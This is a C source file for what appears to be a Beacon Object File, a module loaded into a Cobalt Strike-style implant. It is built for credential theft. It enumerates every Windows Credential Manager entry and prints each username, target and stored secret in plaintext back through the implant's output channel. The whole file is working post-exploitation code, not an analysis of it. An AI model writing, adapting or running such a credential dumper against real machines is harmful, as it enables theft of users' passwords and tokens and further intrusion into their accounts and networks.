#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"

// Credential types (define only what's needed and not already defined)
#ifndef CRED_TYPE_GENERIC
#define CRED_TYPE_GENERIC                   1
#endif
#ifndef CRED_TYPE_DOMAIN_PASSWORD
#define CRED_TYPE_DOMAIN_PASSWORD           2
#endif
#ifndef CRED_TYPE_DOMAIN_CERTIFICATE
#define CRED_TYPE_DOMAIN_CERTIFICATE        3
#endif
#ifndef CRED_TYPE_DOMAIN_VISIBLE_PASSWORD
#define CRED_TYPE_DOMAIN_VISIBLE_PASSWORD   4
#endif

const char* GetCredentialTypeString(DWORD dwType)
{
    switch (dwType)
    {
        case CRED_TYPE_GENERIC:                 return "Generic";
        case CRED_TYPE_DOMAIN_PASSWORD:         return "Domain Password";
        case CRED_TYPE_DOMAIN_CERTIFICATE:      return "Domain Certificate";
        case CRED_TYPE_DOMAIN_VISIBLE_PASSWORD: return "Domain Visible Password";
        case 5:                                 return "Generic Certificate";
        case 6:                                 return "Domain Extended";
        default:                                return "Unknown";
    }
}

const char* GetCredentialPersistString(DWORD dwPersist)
{
    switch (dwPersist)
    {
        case 1:  return "Session";
        case 2:  return "Local Machine";
        case 3:  return "Enterprise";
        default: return "Unknown";
    }
}

DWORD CredentialManagerCheck(void)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    DWORD dwCount = 0;
    PCREDENTIALA *pCredentials = NULL;
    DWORD i = 0;

    internal_printf("=== Credential Manager Check ===\n\n");

    if (!ADVAPI32$CredEnumerateA(NULL, 0, &dwCount, &pCredentials))
    {
        dwErrorCode = KERNEL32$GetLastError();
        
        if (dwErrorCode == ERROR_NOT_FOUND)
        {
            internal_printf("[-] No credentials found in Credential Manager\n");
            dwErrorCode = ERROR_SUCCESS;
            goto CredentialManagerCheck_end;
        }
        
        internal_printf("[!] Error enumerating credentials: 0x%lX\n", dwErrorCode);
        goto CredentialManagerCheck_end;
    }

    internal_printf("[+] Found %lu credential(s)\n\n", dwCount);

    for (i = 0; i < dwCount; i++)
    {
        internal_printf("--- Credential [%lu] ---\n", i + 1);
        internal_printf("  Type:    %s (%lu)\n", 
            GetCredentialTypeString(pCredentials[i]->Type), 
            pCredentials[i]->Type);
        internal_printf("  Persist: %s\n", 
            GetCredentialPersistString(pCredentials[i]->Persist));

        if (pCredentials[i]->TargetName != NULL)
        {
            internal_printf("  Target:  %s\n", pCredentials[i]->TargetName);
        }
        else
        {
            internal_printf("  Target:  <null>\n");
        }

        if (pCredentials[i]->UserName != NULL)
        {
            internal_printf("  User:    %s\n", pCredentials[i]->UserName);
        }
        else
        {
            internal_printf("  User:    <null>\n");
        }

        if (pCredentials[i]->Comment != NULL && pCredentials[i]->Comment[0] != '\0')
        {
            internal_printf("  Comment: %s\n", pCredentials[i]->Comment);
        }

        if (pCredentials[i]->CredentialBlobSize > 0 && pCredentials[i]->CredentialBlob != NULL)
        {
            internal_printf("  Secret:  %.*s\n", 
                pCredentials[i]->CredentialBlobSize, 
                (char*)pCredentials[i]->CredentialBlob);
        }
        else
        {
            internal_printf("  Secret:  <empty or protected>\n");
        }

        internal_printf("\n");
    }

    internal_printf("[*] Enumeration complete: %lu credential(s) found\n", dwCount);

CredentialManagerCheck_end:
    if (pCredentials != NULL)
    {
        ADVAPI32$CredFree(pCredentials);
        pCredentials = NULL;
    }

    return dwErrorCode;
}

#ifdef BOF
VOID go(
    IN PCHAR Buffer,
    IN ULONG Length
)
{
    DWORD dwErrorCode = ERROR_SUCCESS;

    if (!bofstart())
    {
        return;
    }

    dwErrorCode = CredentialManagerCheck();
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "CredentialManagerCheck failed: 0x%lX\n", dwErrorCode);
        goto go_end;
    }

go_end:
    printoutput(TRUE);
    bofstop();
}
#else
int main(int argc, char **argv)
{
    DWORD dwErrorCode = ERROR_SUCCESS;

    dwErrorCode = CredentialManagerCheck();
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "CredentialManagerCheck failed: 0x%lX\n", dwErrorCode);
        goto main_end;
    }

main_end:
    return dwErrorCode;
}
#endif